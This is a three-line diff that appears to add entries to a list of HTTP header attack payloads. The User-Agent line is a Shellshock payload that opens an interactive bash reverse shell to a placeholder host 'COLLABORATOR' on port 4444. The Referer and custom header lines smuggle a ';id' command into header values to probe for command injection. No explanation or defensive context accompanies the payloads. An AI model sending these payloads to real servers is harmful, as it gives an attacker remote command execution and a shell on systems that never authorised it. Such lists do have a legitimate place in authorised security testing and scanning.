@@ -1,0 +1,3 @@
+User-Agent: () { ignored; }; /bin/bash -i >& /dev/tcp/COLLABORATOR/4444 0>&1 (ShellShock)
+Referer: ;id
+X-Custom: ;id
